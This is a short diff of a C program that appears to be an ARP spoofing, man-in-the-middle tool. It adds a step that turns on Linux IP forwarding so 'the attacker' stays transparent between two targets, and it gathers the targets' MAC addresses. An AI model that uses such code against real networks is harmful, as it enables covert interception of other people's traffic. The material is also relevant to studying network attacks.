@@ -144,8 +144,14 @@ int main(int argc, char **argv)
 
   /* ====================================================================== */
 
-  send_arp_request(sockfd, ifindex, ipaddr, macaddr, target1_ip);
+  /* Ensures IP forwarding is enabled on Linux, in order to make he
+     attacker "transparent" to packets moving form target1 to
+     target2. This is not persistent on reboot. */
+  system("echo 1 > /proc/sys/net/ipv4/ip_forward");
 
+  /* We send normal requests to both targets in order to get their
+     hardware addresses.  */
+  send_arp_request(sockfd, ifindex, ipaddr, macaddr, target1_ip);
   struct ether_arp reply1;
   listen_arp_frame(sockfd, &reply1);
   unsigned char *macaddr1 = reply1.arp_sha;
